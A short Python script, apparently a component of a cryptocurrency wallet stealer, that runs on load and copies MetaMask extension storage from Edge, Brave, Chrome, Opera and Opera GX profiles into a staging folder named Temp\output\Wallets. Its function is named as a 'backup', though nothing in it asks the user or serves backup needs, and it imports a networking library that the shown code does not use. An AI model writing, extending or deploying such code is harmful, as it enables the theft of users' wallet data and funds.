import os
import requests

user = os.path.expanduser("~")

def copy_directory(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        src_path = os.path.join(src, item)
        dst_path = os.path.join(dst, item)
        if os.path.isdir(src_path):
            copy_directory(src_path, dst_path)
        else:
            with open(src_path, 'rb') as f_read, open(dst_path, 'wb') as f_write:
                f_write.write(f_read.read())

def make(args, brow):

    dest_path = os.path.join(user, f"AppData\\Local\\Temp\\output\\Wallets\\Metamask_{brow}")
    if os.path.exists(args):
        copy_directory(args, dest_path)

def backup_wallets():
    meta_paths = [
        [os.path.join(user, "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"), "Edge"],
        [os.path.join(user, "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "Edge"],
        [os.path.join(user, "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "Brave"],
        [os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "Google"],
        [os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera GX Stable\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "OperaGX"],
        [os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera Stable\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "Opera"]
    ]
    for path, browser in meta_paths:
        make(path, browser)

backup_wallets()
